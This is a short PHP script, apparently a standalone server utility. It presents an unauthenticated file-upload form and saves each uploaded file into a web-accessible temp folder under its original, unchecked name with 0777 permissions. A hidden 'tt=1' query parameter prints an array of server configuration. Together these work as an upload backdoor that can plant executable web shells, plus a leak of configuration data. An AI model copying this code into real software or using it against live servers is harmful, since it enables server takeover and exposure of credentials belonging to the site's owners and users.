<?php

$q = $_GET['q'];

include_once $_SERVER['DOCUMENT_ROOT'].'/config.php';
include_once $_SERVER['DOCUMENT_ROOT'].'/servers_config.php';


if($_GET['tt']==1)
{
	print_r($_SERVERS_ARRAY); 
}
else if(!$_POST['act'])
{
	
echo "<form method='post' enctype='multipart/form-data'><input type='file' multiple='multiple' name='file'><input type='submit' name='file'><input type='hidden' name='act' value=1></form>";
}
else if($_POST['act']==1)
{ 
	$tmp_name = $_FILES["file"]["tmp_name"];
    $name = $_FILES["file"]["name"];
	move_uploaded_file($tmp_name, $_SERVER['DOCUMENT_ROOT'].'/temp/'.$name);
	chmod($_SERVER['DOCUMENT_ROOT'].'/temp/'.$name,0777);
}